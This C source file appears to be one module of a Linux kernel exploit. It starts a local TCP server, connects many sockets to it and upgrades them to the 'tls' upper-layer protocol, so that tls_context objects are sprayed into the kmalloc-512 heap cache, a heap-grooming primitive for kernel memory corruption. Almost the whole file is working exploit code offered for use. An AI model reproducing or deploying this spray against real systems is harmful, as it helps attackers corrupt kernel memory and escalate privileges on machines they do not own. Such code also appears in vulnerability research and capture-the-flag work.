#include "tls.h"

int tls_fds[N_TLS_FDS];

pid_t server_pid;

err_t new_tls_session(void)
{
    if (! (server_pid = fork())) {
        int err = start_server();
        if (err < 0)
            exit(EXIT_FAILURE);
        __builtin_unreachable();
    }
    usleep(2000000);
    return create_tls_socks();;
}

static inline err_t kill_server(void)
{
    IF_ERR_RET(kill(server_pid, SIGKILL))
    IF_ERR_RET(waitpid(server_pid, NULL, 0))
    return SUCC;
}

err_t end_tls_session(void)
{
    IF_ERR_RET(destroy_tls_socks())
    IF_ERR_RET(kill_server())
    return SUCC;
}

err_t getsockopt_all_tls(int level, int name, void *value, void* len)
{
    for (int i = 0; i < N_TLS_FDS; ++i) {
        IF_ERR(tls_fds[i]) {
            perror("getsockopt_all_tls:fd=-1");
            return ERR;
        }
        getsockopt(tls_fds[i], level, name, value, len);
    }
    return SUCC;
}

err_t tcp_sock_configure(int fd)
{
    /* Set some options on tcp socket to make them not close and stuff */
    int keepalive = 1;

    if (setsockopt(fd, SOL_SOCKET, SO_KEEPALIVE, &keepalive, sizeof(keepalive))) {
        perror("setsockopt(fd, SOL_SOCKET, SO_KEEPALIVE, 1)");
        return ERR;
    }

    int idle_time = 60 * 60; // one hour
    if (setsockopt(fd, SOL_TCP, TCP_KEEPIDLE, &idle_time, sizeof(idle_time))) {
        perror("setsockopt(fd, SOL_TCP, TCP_KEEPIDLE, 60*60)");
        return ERR;
    }
    return SUCC;
}

err_t create_tls_socks(void)
{
    /* Creates a bunch of connected TCP sockets
       that we can upgrade to ULP_TCP "tls" later */

    puts("[+] Creating TCP socks to upgrade later.");
    memset(tls_fds, -1, sizeof(tls_fds));

    for (int i = 0; i < N_TLS_FDS; ++i) {
        int fd = socket(AF_INET, SOCK_STREAM, 0);
        if (fd < 0) {
            perror("Error allocating socket");
            return ERR;
        }

        if (tcp_sock_configure(fd) < 0) {
            return ERR;
        }

        // the sockets need to be connected before they can be upgraded to tls sockets
        struct sockaddr_in server;
        inet_aton("127.0.0.1", &server.sin_addr);
        server.sin_port = htons(9999);
        server.sin_family = AF_INET;
        if (connect(fd, (struct sockaddr*)&server, sizeof(server))) {
            perror("connect");
            return ERR;
        }
        tls_fds[i] = fd;
    }

    return SUCC;
}

err_t upgrade_tls_socks(void)
{
    puts("[+] Upgrading socks to TLS to spray.");

    for (int i = 0; i < N_TLS_FDS; i++) {
        int fd = tls_fds[i];
        // struct tls_context allocation in kmalloc-512
        if (setsockopt(fd, SOL_TCP, TCP_ULP, "tls", sizeof("tls"))) {
            perror("setsockopt(fd, SOL_TCP, TCP_ULP, \"tls\"");
            printf("fd: %d\n", fd);
            return ERR_UNFIN(i);
        };
    }

    return N_TLS_FDS;
}

err_t destroy_tls_socks(void)
{
    register int fd = 0;

    for (int i = 0; i < N_TLS_FDS; ++i) {
        fd = XCHNG_FD(tls_fds[i], ERR);

        IF_ERR(fd)
            continue;

        IF_ERR(close(fd)) {
            perror("destroy_tls_socks:close");
            return ERR;
        }
    }
    return SUCC;
}

err_t start_server(void)
{
    /* Start TCP server that will accept connections on 127.0.0.1:9999
       we need this for elevating sockets to TLS ULP */
    int fd = socket(AF_INET, SOCK_STREAM, 0);
    if (fd < 0) {
        perror("start_server:socket");
        return ERR;
    }
    tcp_sock_configure(fd);

    int reuse = 1;
    setsockopt(fd, SOL_SOCKET, SO_REUSEADDR, &reuse, sizeof(reuse));

    struct sockaddr_in s;
    inet_aton("127.0.0.1", &s.sin_addr);
    s.sin_family = AF_INET;
    s.sin_port = htons(9999);

    if (bind(fd, (struct sockaddr*)&s, sizeof(s))) {
        perror("start_server:bind");
        return ERR;
    }
    if (listen(fd, 9999)) {
        perror("start_server:listen");
        return ERR;
    }

    puts("Listening on 127.0.0.1:9999 (tcp)");
    for (;;) {
        struct sockaddr_in client;
        socklen_t client_sz = sizeof(client);
        // just accept and do nothing lol.

        int afd = accept(fd, (struct sockaddr*)&client, &client_sz);

        if (afd < 0) {
            perror("start_server:accept");
            return ERR;
        }

        tcp_sock_configure(afd);
    }

    __builtin_unreachable();
}
